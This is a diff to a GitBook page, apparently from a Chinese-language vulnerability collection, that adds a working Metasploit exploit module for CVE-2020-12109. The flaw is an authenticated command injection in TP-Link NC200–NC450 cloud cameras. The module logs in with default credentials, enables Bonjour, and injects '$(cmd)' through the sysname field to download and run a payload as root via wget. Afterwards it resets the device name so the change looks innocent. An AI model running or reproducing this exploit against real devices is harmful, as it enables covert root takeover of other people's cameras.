@@ -713,6 +713,165 @@
                                 <section class="normal markdown-section">
                                 
                                 <h1 id="tp-link&#x4E91;&#x6444;&#x50CF;&#x5934;ncxxx&#x7CFB;&#x5217;&#x5B58;&#x5728;&#x547D;&#x4EE4;&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;">TP-Link&#x4E91;&#x6444;&#x50CF;&#x5934;NCXXX&#x7CFB;&#x5217;&#x5B58;&#x5728;&#x547D;&#x4EE4;&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;</h1>
+<h2 id="&#x5F71;&#x54CD;&#x8303;&#x56F4;">#&#x5F71;&#x54CD;&#x8303;&#x56F4;</h2>
+<p>NC200 NC220 NC230 NC250 NC260 NC450</p>
+<h2 id="poc">#Poc</h2>
+<pre><code class="lang-ruby"><span class="hljs-comment">##</span>
+<span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span>
+<span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span>
+<span class="hljs-comment">##</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MetasploitModule</span> &lt; Msf::Exploit::<span class="hljs-title">Remote</span></span>
+  Rank = ExcellentRanking
+
+  <span class="hljs-keyword">include</span> <span class="hljs-symbol">Msf:</span><span class="hljs-symbol">:Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Remote</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:HttpClient</span>
+  <span class="hljs-keyword">include</span> <span class="hljs-symbol">Msf:</span><span class="hljs-symbol">:Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CmdStager</span>
+
+  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">initialize</span><span class="hljs-params">(info = {})</span></span>
+    <span class="hljs-keyword">super</span>(
+      update_info(
+        info,
+        <span class="hljs-string">&apos;Name&apos;</span> =&gt; <span class="hljs-string">&apos;TP-Link Cloud Cameras NCXXX Bonjour Command Injection&apos;</span>,
+        <span class="hljs-string">&apos;Description&apos;</span> =&gt; <span class="hljs-string">%q{
+          TP-Link cloud cameras NCXXX series (NC200, NC210, NC220, NC230,
+          NC250, NC260, NC450) are vulnerable to an authenticated command
+          injection. In all devices except NC210, despite a check on the name length in
+          swSystemSetProductAliasCheck, no other checks are in place in order
+          to prevent shell metacharacters from being introduced. The system name
+          would then be used in swBonjourStartHTTP as part of a shell command
+          where arbitrary commands could be injected and executed as root. NC210 devices
+          cannot be exploited directly via /setsysname.cgi due to proper input
+          validation. NC210 devices are still vulnerable since swBonjourStartHTTP
+          did not perform any validation when reading the alias name from the
+          configuration file. The configuration file can be written, and code
+          execution can be achieved by combining this issue with CVE-2020-12110.
+        }</span>,
+        <span class="hljs-string">&apos;Author&apos;</span> =&gt; [<span class="hljs-string">&apos;Pietro Oliva &lt;pietroliva[at]gmail.com&gt;&apos;</span>],
+        <span class="hljs-string">&apos;License&apos;</span> =&gt; MSF_LICENSE,
+        <span class="hljs-string">&apos;References&apos;</span> =&gt;
+        [
+          [ <span class="hljs-string">&apos;URL&apos;</span>, <span class="hljs-string">&apos;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12109&apos;</span> ],
+          [ <span class="hljs-string">&apos;URL&apos;</span>, <span class="hljs-string">&apos;https://nvd.nist.gov/vuln/detail/CVE-2020-12109&apos;</span> ],
+          [ <span class="hljs-string">&apos;URL&apos;</span>, <span class="hljs-string">&apos;https://seclists.org/fulldisclosure/2020/May/2&apos;</span> ],
+          [ <span class="hljs-string">&apos;CVE&apos;</span>, <span class="hljs-string">&apos;2020-12109&apos;</span>]
+        ],
+        <span class="hljs-string">&apos;DisclosureDate&apos;</span> =&gt; <span class="hljs-string">&apos;2020-04-29&apos;</span>,
+        <span class="hljs-string">&apos;Platform&apos;</span> =&gt; <span class="hljs-string">&apos;linux&apos;</span>,
+        <span class="hljs-string">&apos;Arch&apos;</span> =&gt; ARCH_MIPSLE,
+        <span class="hljs-string">&apos;Targets&apos;</span> =&gt;
+        [
+          [
+            <span class="hljs-string">&apos;TP-Link NC200, NC220, NC230, NC250&apos;</span>,
+            {
+              <span class="hljs-string">&apos;Arch&apos;</span> =&gt; ARCH_MIPSLE,
+              <span class="hljs-string">&apos;Platform&apos;</span> =&gt; <span class="hljs-string">&apos;linux&apos;</span>,
+              <span class="hljs-string">&apos;CmdStagerFlavor&apos;</span> =&gt; [ <span class="hljs-string">&apos;wget&apos;</span> ]
+            }
+          ],
+          [
+            <span class="hljs-string">&apos;TP-Link NC260, NC450&apos;</span>,
+            {
+              <span class="hljs-string">&apos;Arch&apos;</span> =&gt; ARCH_MIPSLE,
+              <span class="hljs-string">&apos;Platform&apos;</span> =&gt; <span class="hljs-string">&apos;linux&apos;</span>,
+              <span class="hljs-string">&apos;CmdStagerFlavor&apos;</span> =&gt; [ <span class="hljs-string">&apos;wget&apos;</span> ],
+              <span class="hljs-string">&apos;DefaultOptions&apos;</span> =&gt; { <span class="hljs-string">&apos;SSL&apos;</span> =&gt; <span class="hljs-keyword">true</span> }
+            }
+          ]
+        ],
+        <span class="hljs-string">&apos;DefaultTarget&apos;</span> =&gt; <span class="hljs-number">0</span>
+      )
+    )
+
+    register_options(
+      [
+        OptString.new(<span class="hljs-string">&apos;USERNAME&apos;</span>, [ <span class="hljs-keyword">true</span>, <span class="hljs-string">&apos;The web interface username&apos;</span>, <span class="hljs-string">&apos;admin&apos;</span> ]),
+        OptString.new(<span class="hljs-string">&apos;PASSWORD&apos;</span>, [ <span class="hljs-keyword">true</span>, <span class="hljs-string">&apos;The web interface password for the specified username&apos;</span>, <span class="hljs-string">&apos;admin&apos;</span> ])
+      ]
+    )
+  <span class="hljs-keyword">end</span>
+
+  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span></span>
+    user = datastore[<span class="hljs-string">&apos;USERNAME&apos;</span>]
+    pass = Base64.strict_encode64(datastore[<span class="hljs-string">&apos;PASSWORD&apos;</span>])
+    <span class="hljs-keyword">if</span> target.name == <span class="hljs-string">&apos;TP-Link NC260, NC450&apos;</span>
+      pass = <span class="hljs-symbol">Rex:</span><span class="hljs-symbol">:Text</span>.md5(pass)
+    <span class="hljs-keyword">end</span>
+
+    print_status(<span class="hljs-string">&quot;Authenticating with <span class="hljs-subst">#{user}</span>:<span class="hljs-subst">#{pass}</span> ...&quot;</span>)
+    <span class="hljs-keyword">begin</span>
+      res = send_request_cgi({
+        <span class="hljs-string">&apos;uri&apos;</span> =&gt; <span class="hljs-string">&apos;/login.fcgi&apos;</span>,
+        <span class="hljs-string">&apos;method&apos;</span> =&gt; <span class="hljs-string">&apos;POST&apos;</span>,
+        <span class="hljs-string">&apos;vars_post&apos;</span> =&gt; {
+          <span class="hljs-string">&apos;Username&apos;</span> =&gt; user,
+          <span class="hljs-string">&apos;Password&apos;</span> =&gt; pass
+        }
+      })
+      <span class="hljs-keyword">if</span> res.<span class="hljs-keyword">nil</span>? || res.code == <span class="hljs-number">404</span>
+        fail_with(<span class="hljs-symbol">Failure:</span><span class="hljs-symbol">:NoAccess</span>, <span class="hljs-string">&apos;/login.fcgi did not reply correctly. Wrong target ip?&apos;</span>)
+      <span class="hljs-keyword">end</span>
+      <span class="hljs-keyword">if</span> res.body =~ <span class="hljs-regexp">/\&quot;errorCode\&quot;\:0/</span> &amp;&amp; res.headers.key?(<span class="hljs-string">&apos;Set-Cookie&apos;</span>) &amp;&amp; res.body =~ <span class="hljs-regexp">/token/</span>
+        print_good(<span class="hljs-string">&quot;Logged-in as <span class="hljs-subst">#{user}</span>&quot;</span>)
+        @cookie = res.get_cookies.scan(<span class="hljs-regexp">/\s?([^, ;]+?)=([^, ;]*?)[;,]/</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]
+        print_good(<span class="hljs-string">&quot;Got cookie: <span class="hljs-subst">#{@cookie}</span>&quot;</span>)
+        @token = res.body.scan(<span class="hljs-regexp">/&quot;(token)&quot;:&quot;([^,&quot;]*)&quot;/</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]
+        print_good(<span class="hljs-string">&quot;Got token: <span class="hljs-subst">#{@token}</span>&quot;</span>)
+      <span class="hljs-keyword">else</span>
+        fail_with(<span class="hljs-symbol">Failure:</span><span class="hljs-symbol">:NoAccess</span>, <span class="hljs-string">&quot;Login failed with <span class="hljs-subst">#{user}</span>:<span class="hljs-subst">#{pass}</span>&quot;</span>)
+      <span class="hljs-keyword">end</span>
+    <span class="hljs-keyword">rescue</span> <span class="hljs-symbol">:</span><span class="hljs-symbol">:Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:ConnectionError</span>
+      fail_with(<span class="hljs-symbol">Failure:</span><span class="hljs-symbol">:Unreachable</span>, <span class="hljs-string">&apos;Connection failed&apos;</span>)
+    <span class="hljs-keyword">end</span>
+  <span class="hljs-keyword">end</span>
+
+  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">enable_bonjour</span></span>
+    res = send_request_cgi({
+      <span class="hljs-string">&apos;uri&apos;</span> =&gt; <span class="hljs-string">&apos;/setbonjoursetting.fcgi&apos;</span>,
+      <span class="hljs-string">&apos;method&apos;</span> =&gt; <span class="hljs-string">&apos;POST&apos;</span>,
+      <span class="hljs-string">&apos;encode_params&apos;</span> =&gt; <span class="hljs-keyword">false</span>,
+      <span class="hljs-string">&apos;cookie&apos;</span> =&gt; <span class="hljs-string">&quot;sess=<span class="hljs-subst">#{@cookie}</span>&quot;</span>,
+      <span class="hljs-string">&apos;vars_post&apos;</span> =&gt; {
+        <span class="hljs-string">&apos;bonjourState&apos;</span> =&gt; <span class="hljs-string">&apos;1&apos;</span>,
+        <span class="hljs-string">&apos;token&apos;</span> =&gt; @token.to_s
+      }
+    })
+    <span class="hljs-keyword">return</span> res
+  <span class="hljs-keyword">rescue</span> <span class="hljs-symbol">:</span><span class="hljs-symbol">:Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:ConnectionError</span>
+    vprint_error(<span class="hljs-string">&quot;Failed connection to the web server at <span class="hljs-subst">#{rhost}</span>:<span class="hljs-subst">#{rport}</span>&quot;</span>)
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">nil</span>
+  <span class="hljs-keyword">end</span>
+
+  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sys_name</span><span class="hljs-params">(cmd)</span></span>
+    res = send_request_cgi({
+      <span class="hljs-string">&apos;uri&apos;</span> =&gt; <span class="hljs-string">&apos;/setsysname.fcgi&apos;</span>,
+      <span class="hljs-string">&apos;method&apos;</span> =&gt; <span class="hljs-string">&apos;POST&apos;</span>,
+      <span class="hljs-string">&apos;encode_params&apos;</span> =&gt; <span class="hljs-keyword">true</span>,
+      <span class="hljs-string">&apos;cookie&apos;</span> =&gt; <span class="hljs-string">&quot;sess=<span class="hljs-subst">#{@cookie}</span>&quot;</span>,
+      <span class="hljs-string">&apos;vars_post&apos;</span> =&gt; {
+        <span class="hljs-string">&apos;sysname&apos;</span> =&gt; cmd,
+        <span class="hljs-string">&apos;token&apos;</span> =&gt; @token.to_s
+      }
+    })
+    <span class="hljs-keyword">return</span> res
+  <span class="hljs-keyword">rescue</span> <span class="hljs-symbol">:</span><span class="hljs-symbol">:Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:ConnectionError</span>
+    vprint_error(<span class="hljs-string">&quot;Failed connection to the web server at <span class="hljs-subst">#{rhost}</span>:<span class="hljs-subst">#{rport}</span>&quot;</span>)
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">nil</span>
+  <span class="hljs-keyword">end</span>
+
+  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">execute_command</span><span class="hljs-params">(cmd, _opts = {})</span></span>
+    print_status(<span class="hljs-string">&quot;Executing command: <span class="hljs-subst">#{cmd}</span>&quot;</span>)
+    sys_name(<span class="hljs-string">&quot;$(<span class="hljs-subst">#{cmd}</span>)&quot;</span>)
+  <span class="hljs-keyword">end</span>
+
+  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploit</span></span>
+    login <span class="hljs-comment"># Get cookie and csrf token</span>
+    enable_bonjour <span class="hljs-comment"># Enable bonjour service</span>
+    execute_cmdstager <span class="hljs-comment"># Upload and execute payload</span>
+    sys_name(<span class="hljs-string">&apos;NC200&apos;</span>) <span class="hljs-comment"># Set back an innocent-looking device name</span>
+  <span class="hljs-keyword">end</span>
+
+<span class="hljs-keyword">end</span>
+</code></pre>
 
                                 
                                 </section>
@@ -756,7 +915,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"TP-Link云摄像头NCXXX系列存在命令注入漏洞","level":"2.1.11","depth":2,"next":{"title":"SpamTitan 7.07多个RCE漏洞","level":"2.1.12","depth":2,"path":"SpamTitan-7.07-rce.md","ref":"SpamTitan-7.07-rce.md","articles":[]},"previous":{"title":"UsualToolCMS-8.0 sql注入漏洞","level":"2.1.10","depth":2,"path":"UsualToolCMS-8.0-sqli.md","ref":"UsualToolCMS-8.0-sqli.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"TP-Link-rce.md","mtime":"2020-10-21T11:07:06.468Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-10-22T03:42:07.725Z"},"basePath":".","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"TP-Link云摄像头NCXXX系列存在命令注入漏洞","level":"2.1.11","depth":2,"next":{"title":"SpamTitan 7.07多个RCE漏洞","level":"2.1.12","depth":2,"path":"SpamTitan-7.07-rce.md","ref":"SpamTitan-7.07-rce.md","articles":[]},"previous":{"title":"UsualToolCMS-8.0 sql注入漏洞","level":"2.1.10","depth":2,"path":"UsualToolCMS-8.0-sqli.md","ref":"UsualToolCMS-8.0-sqli.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"TP-Link-rce.md","mtime":"2020-10-22T08:42:32.588Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-11-01T02:47:38.201Z"},"basePath":".","book":{"language":""}});
         });
     </script>
 </div>
